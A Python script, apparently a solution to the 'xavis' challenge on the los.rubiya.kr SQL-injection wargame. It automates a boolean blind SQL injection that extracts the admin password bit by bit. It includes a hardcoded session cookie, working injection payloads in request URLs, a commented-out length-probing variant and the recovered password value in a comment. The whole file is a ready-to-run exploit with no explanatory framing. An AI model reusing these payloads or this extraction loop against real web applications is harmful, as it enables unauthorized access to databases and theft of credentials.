import requests


def blindi():
	password=""
	cookies={"PHPSESSID":"2jmdje149iheon8es94327lllt"}
	match_list=list(range(48,58))+list(range(97,123))
	# length : pw=-1' or id="admin" and length(pw)=12;%00 div pw=-1' or id="admin" and length(substr(pw,1,1))=4;%00 result 3
	'''
	index=0
	full_length=0
	one_length=0
	while 1:	
		URL="https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw=-1' or id='admin' and length(pw)="+str(index)+";%00"
		response = requests.get(URL, cookies=cookies)
		if "Hello admin" in response.text:
			full_length=index
			break
		else:
			index+=1
	print("pw length : "+str(full_length))

	index=0
	while 1:	
		URL="https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw=-1' or id='admin' and length(substr(pw,1,1))="+str(index)+";%00"
		response = requests.get(URL, cookies=cookies)
		if "Hello admin" in response.text:
			one_length=index
			break
		else:
			index+=1
	print("one of pw length : "+str(one_length))
	loop_count = int(full_length / one_length)
	print("Loop count : " + str(loop_count))
	ord_length=0
	index=0
	while 1:	
		URL="https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw=-1' or id='admin' and length(ord(substr(pw,1,1)))="+str(index)+";%00"
		response = requests.get(URL, cookies=cookies)
		if "Hello admin" in response.text:
			ord_length=index
			break
		else:
			index+=1
	print("one of ord length : "+str(ord_length))
	for i in range(1, loop_count+1):
		print("["+str(i)+"] progress!")
		for o in range(1, ord_length+1):
			for guess in range(0,10):
				print("guessing : " + str(guess))
				URL="https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw=-1' or id='admin' and substr(ord(substr(pw,"+str(i)+",1)),"+str(o)+",1)="+str(guess)+";%00"
				response = requests.get(URL, cookies=cookies)
				if "Hello admin" in response.text:
					print("found! : "+ str(guess))
					password+=str(guess)
					break
		password+=" "
	print("admin's Password : " + password)
	'''
	for i in range(1,4):
		print(str(i)+" Progress")
		for j in range(1,17):
			URL="https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw=-1' or id='admin' and substr(bin(ord(substr(pw,"+str(i)+",1))),"+str(j)+",1)=1;%00"
			response = requests.get(URL,cookies=cookies)
			if "Hello admin" in response.text:
				password+=str(1)
			else:
				password+=str(0)
			print("current : " + password)
		print("Find password : %s [bit=%s, int=%s] " % (chr(int(password,2)), str(password), str(int(password,2))))
		password=""

	#print("admin's Password : " + password)
	#print('[=] Find Password : %s' % (chr(int(password,2))

if __name__ == "__main__":
	print("Start Program")
	blindi()
	#password 0000c6b00000c6550000ad73
